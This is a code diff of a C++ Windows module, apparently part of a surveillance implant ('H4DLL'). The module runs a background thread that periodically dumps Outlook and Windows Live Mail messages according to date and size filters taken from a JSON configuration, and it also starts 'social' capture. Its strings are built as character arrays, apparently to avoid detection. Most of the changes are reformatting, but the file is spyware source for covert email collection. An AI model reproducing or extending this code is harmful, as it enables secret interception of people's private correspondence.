@@ -1,4 +1,11 @@
-#include "HM_MailAgent/MailAgent.h"
+#include <Windows.h>
+#include <json/JSON.h>
+#include "MailAgent.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/HM_SafeProcedures.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/bss.h"
 
 #define MAIL_SLEEP_TIME 200000 //millisecondi 
 extern void StartSocialCapture(); // Per far partire le opzioni "social"
@@ -10,7 +17,7 @@ HANDLE hMailCapThread = NULL;		// Thread di cattura
 mail_filter_struct g_mail_filter;	// Filtri di cattura usati dal thread
 
 
-BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line)
+BOOL IsNewerDate(FILETIME* date, FILETIME* dead_line)
 {
 	// Controlla prima la parte alta
 	if (date->dwHighDateTime > dead_line->dwHighDateTime)
@@ -30,13 +37,13 @@ BOOL IsNewerDate(FILETIME *date, FILETIME *dead_line)
 
 DWORD WINAPI CaptureMailThread(DWORD dummy)
 {
-	LOOP {
+	LOOP{
 		// Chiama tutte le funzioni per dumpare le mail
 		OL_DumpEmails(&g_mail_filter);
 		WLM_DumpEmails(&g_mail_filter);
 
 		// Sleepa 
-		for (int i=0; i<MAIL_SLEEP_TIME; i+=300) {
+		for (int i = 0; i < MAIL_SLEEP_TIME; i += 300) {
 			CANCELLATION_POINT(g_bMailForceExit);
 			Sleep(300);
 		}
@@ -45,7 +52,7 @@ DWORD WINAPI CaptureMailThread(DWORD dummy)
 
 
 DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
-{	
+{
 	DWORD dummy;
 
 	// Se l'agent e' gia' nella condizione desiderata
@@ -63,7 +70,8 @@ DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 		// Se inserisco una opzione per abilitare o meno la cattura dei social,
 		// questa funzione va chiamata solo se l'opzione e' attiva.
 		StartSocialCapture();
-	} else {
+	}
+	else {
 		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
 		// stoppata (bPM_SnapShotStarted = bStartFlag = FALSE)
 		QUERY_CANCELLATION(hMailCapThread, g_bMailForceExit);
@@ -76,7 +84,6 @@ DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 DWORD __stdcall PM_MailCapInit(JSONObject elem)
 {
 	JSONObject mail, filter;
-	FILETIME ftime;
 	WCHAR mail_tag[] = { 'm', 'a', 'i', 'l', 0 };
 	WCHAR filter_tag[] = { 'f', 'i', 'l', 't', 'e', 'r', 0 };
 
@@ -89,14 +96,14 @@ DWORD __stdcall PM_MailCapInit(JSONObject elem)
 		return 1;
 
 	filter = mail[filter_tag]->AsObject();
-	g_mail_filter.max_size = (DWORD) filter[L"maxsize"]->AsNumber();
+	g_mail_filter.max_size = (DWORD)filter[L"maxsize"]->AsNumber();
 	g_mail_filter.search_string[0] = L'*';
 	g_mail_filter.search_string[1] = 0;
-	
+
 	HM_TimeStringToFileTime(filter[L"datefrom"]->AsString().c_str(), &g_mail_filter.min_date);
-			
-	if (filter[L"dateto"]) 
-		HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);	
+
+	if (filter[L"dateto"])
+		HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);
 	else {
 		g_mail_filter.max_date.dwHighDateTime = 0xffffffff;
 		g_mail_filter.max_date.dwLowDateTime = 0xffffffff;
@@ -124,5 +131,5 @@ DWORD __stdcall PM_MailCapUnregister()
 void PM_MailCapRegister()
 {
 	shared.bPM_MailCapStarted = FALSE;
-	AM_MonitorRegister(L"messages", PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
+	AM_MonitorRegister(L"messages", PM_MAILAGENT, NULL, (BYTE*)PM_MailCapStartStop, (BYTE*)PM_MailCapInit, (BYTE*)PM_MailCapUnregister);
 }
